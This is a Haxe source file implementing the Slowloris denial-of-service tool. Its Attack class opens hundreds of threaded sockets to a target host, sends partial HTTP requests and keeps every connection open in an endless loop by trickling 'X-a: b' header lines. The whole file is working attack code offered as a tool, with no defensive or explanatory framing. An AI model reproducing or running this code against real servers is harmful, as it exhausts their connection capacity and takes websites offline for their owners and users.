package slowloris;

class AttackBase {
	
	public var host(default,null) : String;
	public var port(default,null)  : Int;
	public var numConnections(default,null) : Int;
	public var tcpTimeout(default,null) : Int;
	public var timeout(default,null) : Int;
	public var sendhost(default,null) : String;
	public var cache(default,null) : Bool;
	#if (neko||cpp)
	public var multithreaded(default,null) : Bool;
	#end
	
	var packetcount : Int;
	
	public function new( host : String, ?port : Int = 80,
						 ?numConnections : Int = 500,
						 ?tcpTimeout : Int = 5,
						 ?timeout : Int = 100,
						 ?sendhost : String,
						 cache : Bool = true,
						 multithreaded : Bool = true ) {
		this.host = host;
		this.port = port;
		this.numConnections = numConnections;
		this.tcpTimeout = tcpTimeout;
		this.timeout = timeout;
		this.sendhost = ( sendhost != null ) ? sendhost : host;
		this.cache = cache;
		#if (neko||cpp)
		this.multithreaded = multithreaded;
		#end
	}
	
	public function start() {
		packetcount = 0;
		trace( "Connecting to "+host+":"+port+" every "+timeout+" seconds with "+numConnections+" sockets:" );
	}
}

#if (neko||cpp||php)

#if neko
import neko.Lib;
import neko.Sys;
import neko.net.Host;
import neko.net.Socket;
import neko.vm.Thread;
#elseif cpp
import cpp.Lib;
import cpp.net.Socket;
import cpp.vm.Thread;
import cpp.Sys;
import cpp.net.Host;
import cpp.vm.Thread;
#elseif php
import php.Lib;
import php.net.Socket;
import php.Sys;
import php.net.Host;
#end

class Attack extends AttackBase {
	
	public override function start() {
		super.start();
		#if (neko||cpp)
		if( multithreaded ) {
			var connectionsPerThread = 50;
			var i = 0;
			var threads = new List<Thread>();
			while( i < numConnections ) {
				var t = Thread.create( doMultithreadConnections );
				t.sendMessage( Thread.current() );
				t.sendMessage( connectionsPerThread );
				t.sendMessage( tcpTimeout );
				t.sendMessage( host );
				t.sendMessage( port );
				t.sendMessage( sendhost );
				t.sendMessage( timeout );
				threads.add(t);
				i += connectionsPerThread;
			}
			for( t in threads ) {
				Thread.readMessage( true );
			}
			return;
		}
		#end
		doConnections( numConnections, tcpTimeout, host, port, sendhost, timeout );
	}
	
	#if (neko||cpp)
	function doMultithreadConnections() {
		var main : Thread = Thread.readMessage(true);
		var num : Int = Thread.readMessage(true);
		var timeouttcp : Int = Thread.readMessage(true);
		var host : String = Thread.readMessage(true);
		var port : Int = Thread.readMessage(true);
		var sendhost : String = Thread.readMessage(true);
		var timeout : Int = Thread.readMessage(true);
		doConnections( num, timeouttcp, host, port, sendhost, timeout );
		main.sendMessage( "thread done" );
	}
	#end
	
	function doConnections( num : Int, timeouttcp : Int, host : String, port : Int, sendhost : String, timeout : Int ) {
		var socks = new Array();
		while( true ) {
			trace( "    Building "+num+" sockets" );
			for( z in 0...num ) {
				var s = new Socket();
				try s.connect( new Host( host ), port ) catch( e : Dynamic ) {
					socks.remove( s );
					continue;
				}
				s.setTimeout( timeouttcp );
				packetcount += 3;  // SYN, SYN+ACK, ACK
				var payload = Slowloris.createPayload( sendhost, cache );
				try s.write( payload ) catch( e : Dynamic ) {
					socks.remove( s );
					continue;
				}
				packetcount++;
				socks.push( s );
			}
			trace( "    Sending data."+socks.length );
			for( sock in socks ) {
				try sock.write( "X-a: b\r\n" ) catch( e : Dynamic ) {
					socks.remove( sock );
					continue;
				}
				packetcount++;
			}
			trace( "  Slowloris has sent "+packetcount+" packets" );
			trace( "  This thread is now sleeping for "+timeout+" seconds ..." );
			Sys.sleep( timeout );
		}
	}
	
}

#end
